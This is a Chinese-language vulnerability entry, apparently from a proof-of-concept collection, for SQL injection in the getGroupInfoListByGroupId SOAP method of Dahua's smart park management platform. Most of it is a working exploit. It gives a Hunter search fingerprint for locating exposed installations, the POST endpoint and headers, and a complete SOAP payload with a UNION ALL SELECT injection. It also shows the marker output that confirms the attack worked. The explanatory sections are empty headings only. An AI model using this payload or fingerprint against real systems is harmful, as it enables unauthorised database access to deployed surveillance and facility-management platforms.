# 大华智慧园区综合管理平台getGroupInfoListByGroupIdSQL注入漏洞

- **系统**：大华　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`hunter：`app.name="Dahua 大华 智慧园区管理平台"``
- **请求**：`POST /portal/services/clientServer HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`　`Host: {hostname}`　`Content-Length: 509`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
<soapenv:Header/>
<soapenv:Body>
<cli:getGroupInfoListByGroupId>
<!--type: string-->
<arg0>5398) UNION ALL SELECT 5336,5336,5336,5336,CONCAT(0x7178787a71,IFNULL(CAST(111*111 AS NCHAR),0x20),0x7171717871)-- -</arg0>
<!--type: long-->
<arg1>10</arg1>
</cli:getGroupInfoListByGroupId>
</soapenv:Body>
</soapenv:Envelope>
qxxzq12321qqqxq
```

**其他**
- 大华智慧园区综合管理平台getGroupInfoListByGroupId SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台